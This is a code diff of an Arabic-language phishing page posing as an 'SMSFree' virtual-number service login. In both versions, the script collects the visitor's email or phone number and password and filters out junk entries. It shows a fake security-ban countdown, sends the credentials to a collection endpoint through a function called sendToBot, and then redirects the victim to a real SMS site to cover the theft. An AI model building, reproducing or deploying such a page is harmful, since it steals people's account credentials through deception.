@@ -10,13 +10,12 @@
             --bg-color: #0f172a;
             --card-bg: #1e293b;
             --primary-cyan: #22d3ee;
-            --secondary-blue: #0ea5e9;
-            --accent-orange: #fbbf24;
             --text-white: #f8fafc;
+            --error-red: #ef4444;
         }
 
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
             background-color: var(--bg-color);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white);
@@ -29,49 +28,47 @@
         }
 
         .logo-circle {
-            width: 120px; height: 120px; border: 2px solid #334155;
-            border-radius: 50%; margin: 0 auto 30px;
+            width: 100px; height: 100px; border: 2px solid #334155;
+            border-radius: 50%; margin: 0 auto 25px;
             display: flex; justify-content: center; align-items: center;
-            font-size: 24px; font-weight: bold; color: var(--text-white);
+            font-size: 20px; font-weight: bold;
         }
 
-        h2 { font-size: 18px; line-height: 1.6; color: var(--primary-cyan); margin-bottom: 25px; }
+        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }
 
-        /* صندوق الحظر (مخفي افتراضياً) */
         .ban-box {
-            border: 2px solid var(--accent-orange); border-radius: 12px;
-            padding: 12px; margin-bottom: 25px; background: rgba(251, 191, 36, 0.1);
-            color: var(--accent-orange); font-weight: bold; font-size: 14px;
-            display: none; /* إخفاء في البداية */
+            border: 2px solid #fbbf24; border-radius: 12px;
+            padding: 12px; margin-bottom: 20px; background: rgba(251, 191, 36, 0.1);
+            color: #fbbf24; font-weight: bold; display: none;
         }
 
         input {
-            width: 100%; padding: 18px; margin-bottom: 15px;
+            width: 100%; padding: 16px; margin-bottom: 15px;
             background: #0f172a; border: 1px solid #334155;
             border-radius: 12px; color: white; outline: none;
-            text-align: center; font-size: 16px; box-sizing: border-box;
+            text-align: center; font-size: 15px; box-sizing: border-box;
         }
-
-        input.error { border-color: #ef4444; background: rgba(239, 68, 68, 0.05); }
 
         .submit-btn {
-            width: 100%; padding: 18px; margin-top: 10px;
-            background: linear-gradient(to right, var(--secondary-blue), var(--primary-cyan));
+            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
             border: none; border-radius: 12px; color: #0f172a;
-            font-size: 18px; font-weight: bold; cursor: pointer;
-            transition: 0.3s;
+            font-size: 17px; font-weight: bold; cursor: pointer;
         }
 
-        .submit-btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.6; }
-
-        .footer-text { margin-top: 30px; font-size: 12px; color: #64748b; }
+        /* تنسيق التنبيه الشفاف الاحترافي */
+        .glass-popup {
+            background: rgba(30, 41, 59, 0.7) !important;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px !important;
+            color: white !important;
+        }
     </style>
 </head>
 <body>
 
 <div class="main-container">
     <div class="logo-circle">SMSFree</div>
-    
     <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>
 
     <div class="ban-box" id="banBox">
@@ -79,16 +76,14 @@
     </div>
 
     <form id="loginForm">
-        <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
-        <input type="password" id="pass" placeholder="••••••" required>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة المرور" required>
         <button type="submit" id="submitBtn" class="submit-btn">تفعيل الحساب الآن</button>
     </form>
-
-    <div class="footer-text">© Global Virtual Numbers Pro 2024. جميع الحقوق محفوظة.</div>
 </div>
 
 <script>
-    let attempts = 0; // عداد المحاولات
+    let attempts = 0;
     let isBanned = false;
 
     document.getElementById('loginForm').onsubmit = async (e) => {
@@ -97,75 +92,60 @@
 
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
-        const userInput = document.getElementById('user');
-        const passInput = document.getElementById('pass');
 
-        // 1. فحص اللغة العربية (التحقق من وجود أحرف عربية)
-        const arabicPattern = /[\u0600-\u06FF]/;
-        
-        if (arabicPattern.test(user) || arabicPattern.test(pass) || pass.length < 6) {
+        // فحص المدخلات (منع الأحرف العشوائية القصيرة جداً أو العربية)
+        const isInvalid = user.length < 5 || pass.length < 6 || /[\u0600-\u06FF]/.test(user);
+
+        if (isInvalid) {
             attempts++;
-            
-            // تمييز الحقول باللون الأحمر عند الخطأ
-            userInput.classList.add('error');
-            passInput.classList.add('error');
-
             if (attempts >= 3) {
-                activateBan(); // تفعيل الحظر بعد 3 محاولات
+                startBan();
             } else {
+                // نافذة تنبيه شفافة وأنيقة
                 Swal.fire({
-                    text: 'يرجى التأكد من كتابة البريد أو كلمة السر بشكل صحيح (باللغة الإنجليزية فقط)',
-                    icon: 'error',
-                    confirmButtonColor: '#22d3ee'
+                    title: 'تنبيه أمني',
+                    text: 'يرجى التأكد من كتابة البريد الإلكتروني وكلمة المرور بشكل صحيح لتجنب حظرك من استخدام الموقع مؤقتاً.',
+                    icon: 'warning',
+                    customClass: { popup: 'glass-popup' },
+                    confirmButtonColor: '#22d3ee',
+                    confirmButtonText: 'حسناً'
                 });
             }
             return;
         }
 
-        // إذا كانت البيانات بصيغة صحيحة (إنجليزية) يتم الإرسال
-        userInput.classList.remove('error');
-        passInput.classList.remove('error');
+        // إرسال البيانات إذا كانت صحيحة
         sendToBot(user, pass);
     };
 
-    function activateBan() {
+    function startBan() {
         isBanned = true;
-        attempts = 0; // تصفير المحاولات لبعد الحظر
-        const banBox = document.getElementById('banBox');
-        const timerDisplay = document.getElementById('timer');
-        const submitBtn = document.getElementById('submitBtn');
-
-        banBox.style.display = 'block';
-        submitBtn.disabled = true;
-        
+        attempts = 0;
+        document.getElementById('banBox').style.display = 'block';
+        document.getElementById('submitBtn').disabled = true;
         let timeLeft = 30;
-        const countdown = setInterval(() => {
+        const interval = setInterval(() => {
             timeLeft--;
-            timerDisplay.innerText = timeLeft;
+            document.getElementById('timer').innerText = timeLeft;
             if (timeLeft <= 0) {
-                clearInterval(countdown);
-                banBox.style.display = 'none';
-                submitBtn.disabled = false;
+                clearInterval(interval);
+                document.getElementById('banBox').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
                 isBanned = false;
             }
         }, 1000);
     }
 
     async function sendToBot(u, p) {
-        const fullMessage = `🎯 صيد جديد (نظام الحماية) 🎯\n━━━━━━━━━━━━━━━\n👤 المستخدم: \`${u}\` \n🔑 الباسورد: \`${p}\` \n━━━━━━━━━━━━━━━`;
-        
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: fullMessage })
+                body: JSON.stringify({ message: `👤 مستخدم: ${u}\n🔑 كلمة مرور: ${p}` })
             });
             window.location.href = "https://receive-smss.com/";
-        } catch (err) {
-            console.error("خطأ في الإرسال");
-        }
+        } catch (e) {}
     }
 </script>
-
 </body>
 </html>
